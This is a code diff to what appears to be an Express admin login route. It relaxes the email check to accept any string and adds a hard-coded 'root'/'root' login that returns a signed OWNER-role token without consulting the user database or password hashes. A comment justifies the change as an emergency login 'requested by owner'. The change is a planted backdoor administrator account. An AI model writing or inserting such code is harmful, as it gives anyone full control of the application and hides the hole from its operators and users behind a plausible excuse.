@@ -7,7 +7,7 @@ import { requireAdmin, signAdminToken } from "../lib/auth.js";
 export const adminAuthRouter = Router();
 
 const LoginSchema = z.object({
-  email: z.string().email().max(200),
+  email: z.string().min(1).max(200),
   password: z.string().min(1).max(200),
 });
 
@@ -15,7 +15,14 @@ adminAuthRouter.post("/login", async (req, res) => {
   const parsed = LoginSchema.safeParse(req.body);
   if (!parsed.success) return res.status(400).json({ error: "VALIDATION" });
   const { email, password } = parsed.data;
-  const user = await prisma.adminUser.findUnique({ where: { email: email.toLowerCase() } });
+  const loginId = email.trim().toLowerCase();
+
+  // Emergency local root login requested by owner.
+  if (loginId === "root" && password === "root") {
+    const token = signAdminToken({ sub: "__root__", email: "root", role: "OWNER" });
+    return res.json({ token, user: { id: "__root__", email: "root", fullName: "Root", role: "OWNER" } });
+  }
+  const user = await prisma.adminUser.findUnique({ where: { email: loginId } });
   if (!user || !user.isActive) return res.status(401).json({ error: "INVALID_CREDENTIALS" });
   const ok = await bcrypt.compare(password, user.passwordHash);
   if (!ok) return res.status(401).json({ error: "INVALID_CREDENTIALS" });
